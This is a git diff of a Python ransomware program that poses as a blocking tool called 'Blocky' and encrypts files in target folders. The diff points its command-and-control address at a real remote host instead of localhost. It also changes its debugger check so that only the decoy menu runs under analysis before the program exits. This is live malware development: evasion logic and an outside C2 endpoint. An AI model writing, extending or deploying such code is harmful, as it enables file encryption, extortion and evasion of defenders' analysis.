@@ -19,7 +19,8 @@ from time import sleep  # 😴
 
 # Variables
 # Address of the remote C2 server
-c2_url = "http://localhost:5000"
+c2_url = "https://rnsm.uber.space"
+# c2_url = "http://localhost:5000"
 # List of paths. Every file in these lcoations will be encrypted ...
 target_paths = [".\\toencrypt", ".\\toencrypt2"]
 # ..except for the filetypes defined in the following list
@@ -343,11 +344,6 @@ def fake_main():
     rnsm.sync_loop()
 
 
-def main():
-    """Main function responsible for Blocky functionality"""
-    blocky.show_menu()
-
-
 if __name__ == "__main__":
     blocky = FakeBlocker()
     # Exit the programm, should it be run as non-Admin
@@ -355,6 +351,8 @@ if __name__ == "__main__":
         sys.exit()
     # Directly jump into the fake functionality, should a debugger be detected, so no malicious activity is run
     if ctypes.windll.kernel32.IsDebuggerPresent():
-        main()
+        blocky.show_menu()
+        sys.exit()
     # Start check if system is already infected or not
     blocky.initial_check()
+
